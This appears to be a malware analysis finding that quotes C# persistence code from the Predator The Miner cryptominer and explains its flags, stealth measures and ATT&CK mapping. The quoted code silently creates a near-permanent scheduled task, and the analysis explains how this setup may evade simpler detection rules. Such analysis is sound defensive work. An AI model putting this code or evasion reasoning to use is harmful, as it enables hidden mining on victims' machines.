# Finding 3: Predator The Miner - Aggressive Task Repetition

## Metadata
- **Repository**: MalwareSourceCode-main
- **File Path**: `Win32/Win32.PredatorTheMiner.s/Win32.PredatorTheMiner.s/Implant.cs`
- **Language**: C#
- **Malware Family**: Predator The Miner (Cryptocurrency Miner)

## Code Snippet

```csharp
using Microsoft.Win32;
using System;
using System.Diagnostics;

namespace PredatorTheMiner
{
    public class Implant
    {
        public class ScheduleTask
        {
            private string task_name;

            public ScheduleTask(string _task_name)
            {
                task_name = _task_name;
            }

            public void AddTask(string path)
            {
                try
                {
                    // *** SCHEDULED TASK CREATION - LINE 25 ***
                    Process cmd_proc = new Process
                    {
                        StartInfo = new ProcessStartInfo
                        ("cmd", $"/C schtasks /create /tn \\{task_name} /tr {path} /st 00:00 /du 9999:59 /sc once /ri 1 /f")
                    };
                    cmd_proc.StartInfo.CreateNoWindow = true;
                    cmd_proc.StartInfo.UseShellExecute = false;
                    cmd_proc.Start();
                }
                catch { }
            }

            public override string ToString()
            {
                return task_name;
            }
        }
    }
}
```

## Analysis

**What it does:**
Predator The Miner is a cryptocurrency mining malware that uses scheduled tasks to maintain persistence. The task is configured to run continuously with very aggressive repetition timing.

**How it uses Windows Scheduled Tasks (T1053.005):**
- **Task name**: `/tn \{task_name}` - created in root of task scheduler
- **Target**: `/tr {path}` - points to the miner executable path
- **Start time**: `/st 00:00` - starts at midnight
- **Duration**: `/du 9999:59` - runs for 9999 hours and 59 minutes (essentially indefinite)
- **Schedule**: `/sc once` - technically set as "run once" 
- **Repeat interval**: `/ri 1` - repeats every 1 minute during the duration
- **Force**: `/f` - overwrites existing task if present

**Evasion/Stealth Techniques:**
1. **Aggressive repetition**: Every 1 minute repetition ensures the miner restarts quickly if terminated
2. **Hidden execution**: `CreateNoWindow = true` hides the command window
3. **Error suppression**: Empty catch block silently handles failures
4. **Configurable naming**: Task name passed as parameter, allowing operator to choose benign-sounding names
5. **Indefinite duration**: 9999:59 duration ensures near-permanent execution

**Malware Context:**
This is typical of cryptocurrency mining malware which needs to:
- Run continuously to generate cryptocurrency
- Restart quickly if killed by user or security tools
- Remain hidden to avoid detection and manual termination

**Why "sc once" with /ri 1 is effective:**
While the task is scheduled to run "once", the combination of:
- Very long duration (9999:59)
- 1-minute repeat interval (/ri 1)

Creates a task that effectively runs continuously, repeating every minute for years. This is more stealthy than `/sc minute` as it may evade simpler detection rules looking for "run every minute" tasks.

**MITRE ATT&CK Mapping:**
- **T1053.005**: Scheduled Task/Job: Scheduled Task
- **T1496**: Resource Hijacking (cryptocurrency mining)
- **T1564.003**: Hide Artifacts: Hidden Window
